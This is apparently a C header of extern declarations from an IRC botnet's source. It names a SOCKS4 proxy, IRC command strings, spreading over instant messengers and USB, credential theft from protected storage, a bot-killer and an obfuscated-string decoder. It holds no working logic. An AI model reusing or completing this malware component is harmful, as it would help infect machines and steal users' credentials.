
extern unsigned short sock4port;
extern const char get_auth[];
extern int authsize;
extern int curserver;
extern char bid[];
extern char myvershun[];
extern char xetumhandle[];
extern char gotopth[];
extern char exename[];
extern char password[];
extern char prefix;
extern char *authost[];
extern char infochan[];
extern char fbyp[];
extern char rarexe[];
extern char iframe[];
extern char str_msn_msg[];
extern char str_quit_upd[];
extern char usbfname[];
#ifndef NO_SERVICE
extern char servicename[];
extern char servicedisplayname[];
extern char servicedesc[];
#else
extern char szRegname[];
#endif

extern char dir_title[];
extern char process_title[];
extern char irc_title[];
extern char update_title[];
extern char download_title[];
extern char main_title[];
extern char threads_title[];
extern char btkill_title[];
extern char sock4_title[];
extern char imspread_title[];
extern char timspread_title[];
extern char aimspread_title[];
extern char seed_title[];
extern char pstore_title[];
extern char visit_title[];
extern char host[MAX_HOSTNAME];
extern char exip[MAX_IP];
extern char inip[MAX_IP];
extern char str_thread_fail[];

extern char *szFiles[];

extern HANDLE ih;
extern DWORD dwstarted;
extern DWORD dwconnected;
extern THREAD threads[MAX_THREADS];
extern HANDLE xetum;
extern SOCKET sock;
extern SERVER sinfo[];

extern char *Decode(char *s);

extern char str_join[];
extern char str_part[];
extern char str_mode[];
extern char str_pmsg[];
extern char str_note[];
extern char str_pong[];
extern char str_nick[];
extern char str_pass[];
extern char str_user[];
extern char str_quit[];
extern char str_ping[];
